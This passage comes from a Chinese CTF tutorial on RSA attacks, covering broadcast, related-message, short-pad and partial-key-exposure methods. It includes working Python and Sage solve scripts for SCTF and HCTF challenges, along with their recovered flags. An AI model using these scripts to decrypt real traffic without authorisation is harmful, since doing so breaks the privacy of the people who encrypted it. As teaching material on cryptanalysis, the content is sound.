\u5c31\u53ef\u4ee5\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u7ec6\u8282\u7684\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\u540c\u65f6\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u4e0d\u65ad\u66f4\u65b0\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e Coppersmith \u6839\u7684\u7ea6\u675f\uff0c\u5728 RSA \u4e2d\u7684\u5e94\u7528\u65f6\uff0c\u5f80\u5f80\u53ea\u9002\u7528\u4e8e e \u8f83\u5c0f\u7684\u60c5\u51b5\u3002 Basic Broadcast Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 n_1,n_2,n_3 n_1,n_2,n_3 \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe n_1,n_2,n_3\u200b n_1,n_2,n_3\u200b \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002 \u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97 m^3 \\equiv C \\bmod n_1n_2n_3 m^3 \\equiv C \\bmod n_1n_2n_3 \u3002 \u6b64\u5916\uff0c\u65e2\u7136 m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 m^3 < n_1n_2n_3 m^3 < n_1n_2n_3 \u5e76\u4e14 C<m^3 < n_1n_2n_3 C<m^3 < n_1n_2n_3 \uff0c\u90a3\u4e48 m^3 = C m^3 = C \uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002 \u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002 SCTF RSA3 LEVEL4 \u00b6 \u53c2\u8003 http://ohroot.com/2016/07/11/rsa-in-ctf \u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b #!/usr/bin/env python from scapy.all import * import zlib import struct PA = 24 packets = rdpcap ( './syc_security_system_traffic3.pcap' ) client = '192.168.1.180' list_n = [] list_m = [] list_id = [] data = [] for packet in packets: # TCP Flag PA 24 means carry data if packet [ TCP ] .flags == PA or packet [ TCP ] .flags == PA + 1 : src = packet [ IP ] .src raw_data = packet [ TCP ] .load head = raw_data.strip ()[ :7 ] if head == \"We have\" : n, e = raw_data.strip () .replace ( \"We have got N is \" , \"\" ) .split ( '\\ne is ' ) data.append ( n.strip ()) if head == \"encrypt\" : m = raw_data.replace ( 'encrypted messages is 0x' , '' ) .strip () data.append ( str ( int ( m, 16 ))) with open ( './data.txt' , 'w' ) as f: for i in range ( 0 , len ( data ) , 2 ) : tmp = ',' .join ( s for s in data [ i:i + 2 ]) f.write ( tmp + '\\n' ) \u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 from functools import reduce import gmpy import json , binascii def modinv ( a , m ): return int ( gmpy . invert ( gmpy . mpz ( a ), gmpy . mpz ( m ))) def chinese_remainder ( n , a ): sum = 0 prod = reduce ( lambda a , b : a * b , n ) # \u5e76\u884c\u8fd0\u7b97 for n_i , a_i in zip ( n , a ): p = prod // n_i sum += a_i * modinv ( p , n_i ) * p return int ( sum % prod ) nset = [] cset = [] with open ( \"data.txt\" ) as f : now = f . read () . strip ( ' \\n ' ) . split ( ' \\n ' ) for item in now : item = item . split ( ',' ) nset . append ( int ( item [ 0 ])) cset . append ( int ( item [ 1 ])) m = chinese_remainder ( nset , cset ) m = int ( gmpy . mpz ( m ) . root ( 19 )[ 0 ]) print binascii . unhexlify ( hex ( m )[ 2 : - 1 ]) \u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002 H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l \u9898\u76ee \u00b6 2017 WHCTF OldDriver 2018 N1CTF easy_fs Broadcast Attack with Linear Padding \u00b6 \u5bf9\u4e8e\u5177\u6709\u7ebf\u6027\u586b\u5145\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u4ee5\u653b\u51fb\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u4f7f\u7528 Coppersmith method \u7684\u65b9\u6cd5\u4e86\uff0c\u8fd9\u91cc\u6682\u4e0d\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations Related Message Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 Alice \u4f7f\u7528\u540c\u4e00\u516c\u94a5\u5bf9\u4e24\u4e2a\u5177\u6709\u67d0\u79cd\u7ebf\u6027\u5173\u7cfb\u7684\u6d88\u606f M1 \u4e0e M2 \u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u540e\u7684\u6d88\u606f C1\uff0cC2 \u53d1\u9001\u7ed9\u4e86 Bob \u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u6d88\u606f M1 \u4e0e M2\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570\u4e3a N\uff0c\u4e24\u8005\u4e4b\u95f4\u7684\u7ebf\u6027\u5173\u7cfb\u5982\u4e0b M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \u5176\u4e2d f \u4e3a\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570\uff0c\u6bd4\u5982\u8bf4 f=ax+b f=ax+b \u3002 \u5728\u5177\u6709\u8f83\u5c0f\u9519\u8bef\u6982\u7387\u4e0b\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u590d\u6742\u5ea6\u4e3a O(elog^2N) O(elog^2N) \u3002 \u8fd9\u4e00\u653b\u51fb\u7531 Franklin\uff0cReiter \u63d0\u51fa\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 C_1 \\equiv M_1 ^e \\bmod N C_1 \\equiv M_1 ^e \\bmod N \uff0c\u5e76\u4e14 M_1 \\equiv f(M_2) \\bmod N M_1 \\equiv f(M_2) \\bmod N \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 M_2 M_2 \u662f f(x)^e \\equiv C_1 \\bmod N f(x)^e \\equiv C_1 \\bmod N \u7684\u4e00\u4e2a\u89e3\uff0c\u5373\u5b83\u662f\u65b9\u7a0b f(x)^e-C_1 f(x)^e-C_1 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u540c\u6837\u7684\uff0c M_2 M_2 \u662f x^e - C_2 x^e - C_2 \u5728\u6a21 N \u610f\u4e49\u4e0b\u7684\u4e00\u4e2a\u6839\u3002\u6240\u4ee5\u8bf4 x-M_2 x-M_2 \u540c\u65f6\u6574\u9664\u4ee5\u4e0a\u4e24\u4e2a\u591a\u9879\u5f0f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u4e24\u4e2a\u591a\u9879\u5f0f\u7684\u6700\u5927\u516c\u56e0\u5b50\uff0c\u5982\u679c\u6700\u5927\u516c\u56e0\u5b50\u6070\u597d\u662f\u7ebf\u6027\u7684\u8bdd\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 M_2 M_2 \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 e=3 e=3 \u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u516c\u56e0\u5b50\u4e00\u5b9a\u662f\u7ebf\u6027\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e00\u4e0b e=3 e=3 \uff0c\u4e14 f(x)=ax+b f(x)=ax+b \u7684\u60c5\u51b5\u3002\u9996\u5148\u6211\u4eec\u6709 C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N C_1 \\equiv M_1 ^3 \\bmod N,M_1 \\equiv aM_2+b \\bmod N \u90a3\u4e48\u6211\u4eec\u6709 C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N C_1 \\equiv (aM_2+b)^3 \\bmod N,C_2 \\equiv M_2^3 \\bmod N \u6211\u4eec\u9700\u8981\u660e\u786e\u4e00\u4e0b\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u662f\u6d88\u606f m\uff0c\u6240\u4ee5\u9700\u8981\u5c06\u5176\u5355\u72ec\u6784\u9020\u51fa\u6765\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6709\u5f0f 1 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 \u518d\u8005\u6211\u4eec\u6784\u9020\u5982\u4e0b\u5f0f 2 (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N (aM_2)^3-b^3 \\equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \\bmod N \u6839\u636e\u5f0f 1 \u6211\u4eec\u6709 a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1 \\bmod N \u7ee7\u800c\u6211\u4eec\u6709\u5f0f 3 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N 3b(a^2M_2^2+aM_2b+b^2) \\equiv C_1-a^3C_2+2b^3 \\bmod N \u90a3\u4e48\u6211\u4eec\u6839\u636e\u5f0f 2 \u4e0e\u5f0f 3 \u53ef\u5f97 (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N (a^3C_2-b^3)*3b \\equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \\bmod N \u8fdb\u800c\u6211\u4eec\u6709 aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} aM_2-b=\\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} \u8fdb\u800c aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} aM_2\\equiv \\frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} \u8fdb\u800c M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} M_2 \\equiv\\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} \u4e0a\u9762\u7684\u5f0f\u5b50\u4e2d\u53f3\u8fb9\u6240\u6709\u7684\u5185\u5bb9\u90fd\u662f\u5df2\u77e5\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u6d88\u606f\u3002 \u6709\u5174\u8da3\u7684\u53ef\u4ee5\u8fdb\u4e00\u6b65\u9605\u8bfb A New Related Message Attack on RSA \u4ee5\u53ca paper \u8fd9\u91cc\u6682\u4e0d\u505a\u8fc7\u591a\u7684\u8bb2\u89e3\u3002 SCTF RSA3 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\uff0c\u8ddf\u8e2a TCP \u6d41\u53ef\u4ee5\u77e5\u9053\uff0c\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u52a0\u4e0a\u7528\u6237\u7684 user id \u8fdb\u884c\u52a0\u5bc6\uff0c\u800c\u4e14\u8fd8\u5b58\u5728\u591a\u7ec4\u3002\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u7b2c 0 \u7ec4\u548c\u7b2c 9 \u7ec4\uff0c\u4ed6\u4eec\u7684\u6a21\u6570\u4e00\u6837\uff0c\u89e3\u5bc6\u811a\u672c\u5982\u4e0b import gmpy2 id1 = 1002 id2 = 2614 c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 a = 1 b = id1 - id2 def getmessage ( a , b , c1 , c2 , n ): b3 = gmpy2 . powmod ( b , 3 , n ) part1 = b * ( c1 + 2 * c2 - b3 ) % n part2 = a * ( c1 - c2 + 2 * b3 ) % n part2 = gmpy2 . invert ( part2 , n ) return part1 * part2 % n message = getmessage ( a , b , c1 , c2 , n ) - id2 message = hex ( message )[ 2 :] if len ( message ) % 2 != 0 : message = '0' + message print message . decode ( 'hex' ) \u5f97\u5230\u660e\u6587 \u279c sctf-rsa3-level3 git: ( master ) \u2717 python exp.py F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 sage \u6765\u505a\uff0c\u4f1a\u66f4\u52a0\u7b80\u5355\u4e00\u70b9\u3002 import binascii def attack ( c1 , c2 , b , e , n ): PR .< x >= PolynomialRing ( Zmod ( n )) g1 = x ^ e - c1 g2 = ( x + b ) ^ e - c2 def gcd ( g1 , g2 ): while g2 : g1 , g2 = g2 , g1 % g2 return g1 . monic () return - gcd ( g1 , g2 )[ 0 ] c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718 L c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08 L n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553 e = 3 a = 1 id1 = 1002 id2 = 2614 b = id2 - id1 m1 = attack ( c1 , c2 , b , e , n ) print binascii . unhexlify ( \" %x \" % int ( m1 - id1 )) \u7ed3\u679c\u5982\u4e0b \u279c sctf-rsa3-level3 git: ( master ) \u2717 sage exp.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory F4An8LIn_rElT3r_rELa53d_Me33Age_aTtaCk_e_I2_s7aLL \u9898\u76ee \u00b6 hitcon 2014 rsaha N1CTF 2018 rsa_padding Coppersmith\u2019s short-pad attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u76ee\u524d\u5728\u5927\u90e8\u5206\u6d88\u606f\u52a0\u5bc6\u4e4b\u524d\u90fd\u4f1a\u8fdb\u884c padding\uff0c\u4f46\u662f\u5982\u679c padding \u7684\u957f\u5ea6\u8fc7\u77ed\uff0c\u4e5f\u6709 \u53ef\u80fd \u88ab\u5f88\u5bb9\u6613\u5730\u653b\u51fb\u3002 \u8fd9\u91cc\u6240\u8c13 padding \u8fc7\u77ed\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u5e94\u7684\u591a\u9879\u5f0f\u7684\u6839\u4f1a\u8fc7\u5c0f\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u6211\u4eec\u5047\u8bbe\u7231\u4e3d\u4e1d\u8981\u7ed9\u9c8d\u52c3\u53d1\u9001\u6d88\u606f\uff0c\u9996\u5148\u7231\u4e3d\u4e1d\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C1\uff0c\u53d1\u9001\u7ed9\u9c8d\u52c3\u3002\u8fd9\u65f6\uff0c\u4e2d\u95f4\u4eba\u76ae\u7279\u622a\u83b7\u4e86\u5bc6\u6587\u3002\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u7231\u4e3d\u4e1d\u6ca1\u6709\u6536\u5230\u9c8d\u52c3\u7684\u56de\u590d\uff0c\u518d\u6b21\u5bf9\u8981\u52a0\u5bc6\u7684\u6d88\u606f M \u8fdb\u884c\u968f\u673a padding\uff0c\u7136\u540e\u52a0\u5bc6\u5f97\u5230\u5bc6\u6587 C2\uff0c\u53d1\u9001\u7ed9 Bob\u3002\u76ae\u7279\u518d\u4e00\u6b21\u622a\u83b7\u3002\u8fd9\u65f6\uff0c\u76ae\u7279\u5c31 \u53ef\u80fd \u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u539f\u7406\u89e3\u5bc6\u3002 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6a21\u6570 N \u7684\u957f\u5ea6\u4e3a k\uff0c\u5e76\u4e14 padding \u7684\u957f\u5ea6\u4e3a m=\\lfloor \\frac{k}{e^2} \\rfloor m=\\lfloor \\frac{k}{e^2} \\rfloor \u3002\u6b64\u5916\uff0c\u5047\u8bbe\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u7684\u957f\u5ea6\u6700\u591a\u4e3a k-m \u6bd4\u7279\uff0cpadding \u7684\u65b9\u5f0f\u5982\u4e0b M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m M_1=2^mM+r_1, 0\\leq r_1\\leq 2^m \u6d88\u606f M2 \u7684 padding \u65b9\u5f0f\u7c7b\u4f3c\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u89e3\u5bc6\u3002 \u9996\u5148\u5b9a\u4e49 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 g_1(x,y)=x^e-C_1 g_2(x,y)=(x+y)^e-C_2 \u5176\u4e2d y=r_2-r_1 y=r_2-r_1 \u3002\u663e\u7136\u8fd9\u4e24\u4e2a\u65b9\u7a0b\u5177\u6709\u76f8\u540c\u7684\u6839 M1\u3002\u7136\u540e\u8fd8\u6709\u4e00\u7cfb\u5217\u7684\u63a8\u5bfc\u3002 Known High Bits Message Attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u9996\u5148\u52a0\u5bc6\u4e86\u6d88\u606f m\uff0c\u5982\u4e0b C\\equiv m^d \\bmod N C\\equiv m^d \\bmod N \u5e76\u4e14\u6211\u4eec\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u6d88\u606f m \u7684\u5f88\u5927\u7684\u4e00\u90e8\u5206 m_0 m_0 \uff0c\u5373 m=m_0+x m=m_0+x \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 x x \u3002\u90a3\u4e48\u6211\u4eec\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u8be5\u65b9\u6cd5\u8fdb\u884c\u6062\u590d\u6d88\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4e0d\u77e5\u9053\u7684 x \u5176\u5b9e\u5c31\u662f\u591a\u9879\u5f0f\u7684\u6839\uff0c\u9700\u8981\u6ee1\u8db3 Coppersmith \u7684\u7ea6\u675f\u3002 \u53ef\u4ee5\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002 Factoring with High Bits Known \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53\u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u516c\u94a5\u4e2d\u6a21\u6570 N \u7684\u4e00\u4e2a\u56e0\u5b50\u7684\u8f83\u9ad8\u4f4d\u65f6\uff0c\u6211\u4eec\u5c31\u6709\u4e00\u5b9a\u51e0\u7387\u6765\u5206\u89e3 N\u3002 \u653b\u51fb\u5de5\u5177 \u00b6 \u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002\u5173\u6ce8\u4e0b\u9762\u7684\u4ee3\u7801 beta = 0.5 dd = f . degree () epsilon = beta / 7 mm = ceil ( beta ** 2 / ( dd * epsilon )) tt = floor ( dd * mm * (( 1 / beta ) - 1 )) XX = ceil ( N ** (( beta ** 2 / dd ) - epsilon )) + 1000000000000000000000000000000000 roots = coppersmith_howgrave_univariate ( f , N , beta , mm , tt , XX ) \u5176\u4e2d\uff0c \u5fc5\u987b\u6ee1\u8db3 q\\geq N^{beta} q\\geq N^{beta} \uff0c\u6240\u4ee5\u8fd9\u91cc\u7ed9\u51fa\u4e86 beta=0.5 beta=0.5 \uff0c\u663e\u7136\u4e24\u4e2a\u56e0\u6570\u4e2d\u5fc5\u7136\u6709\u4e00\u4e2a\u662f\u5927\u4e8e\u7684\u3002 XX \u662f f(x)=q'+x f(x)=q'+x \u5728\u6a21 q \u610f\u4e49\u4e0b\u7684\u6839\u7684\u4e0a\u754c\uff0c\u81ea\u7136\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u8c03\u6574\u5b83\uff0c\u8fd9\u91cc\u5176\u5b9e\u4e5f\u8868\u660e\u4e86\u6211\u4eec\u5df2\u77e5\u7684 q' q' \u4e0e\u56e0\u6570 q \u4e4b\u95f4\u53ef\u80fd\u7684\u5dee\u8ddd\u3002 2016 HCTF RSA2 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d\u7684 RSA2 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u7a0b\u5e8f\u7684\u5f00\u5934\u662f\u4e00\u4e2a\u7ed5\u8fc7\u9a8c\u8bc1\u7684\uff0c\u7ed5\u8fc7\u5373\u53ef\uff0c\u4ee3\u7801\u5982\u4e0b from pwn import * from hashlib import sha512 sh = remote ( '127.0.0.1' , 9999 ) context . log_level = 'debug' def sha512_proof ( prefix , verify ): i = 0 pading = \"\" while True : try : i = randint ( 0 , 1000 ) pading += str ( i ) if len ( pading ) > 200 : pading = pading [ 200 :] #print pading except StopIteration : break r = sha512 ( prefix + pading ) . hexdigest () if verify in r : return pading def verify (): sh . recvuntil ( \"Prefix: \" ) prefix = sh . recvline () print len ( prefix ) prefix = prefix [: - 1 ] prefix = prefix . decode ( 'base64' ) proof = sha512_proof ( prefix , \"fffffff\" ) sh . send ( proof . encode ( 'base64' )) if __name__ == '__main__' : verify () print 'verify success' sh . recvuntil ( \"token: \" ) token = \"5c9597f3c8245907ea71a89d9d39d08e\" sh . sendline ( token ) sh . recvuntil ( \"n: \" ) n = sh . readline () . strip () n = int ( n [ 2 :], 16 ) sh . recvuntil ( \"e: \" ) e = sh . readline () . strip () e = int ( e [ 2 :], 16 ) sh . recvuntil ( \"e2: \" ) e2 = sh . readline () . strip () e2 = int ( e2 [ 2 :], 16 ) sh . recvuntil ( \"is: \" ) enc_flag = sh . readline () . strip () enc_flag = int ( enc_flag [ 2 : - 1 ], 16 ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) print \"e2: \" , hex ( e2 ) print \"flag: \" , hex ( enc_flag ) \u8fd9\u91cc\u6211\u4eec\u4e5f\u5df2\u7ecf\u5f97\u5230 n\uff0ce\uff0ce2\uff0c\u52a0\u5bc6\u540e\u7684 flag \u4e86\uff0c\u5982\u4e0b n : 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f e : 0x10001 e2 : 0xf93b flag : 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 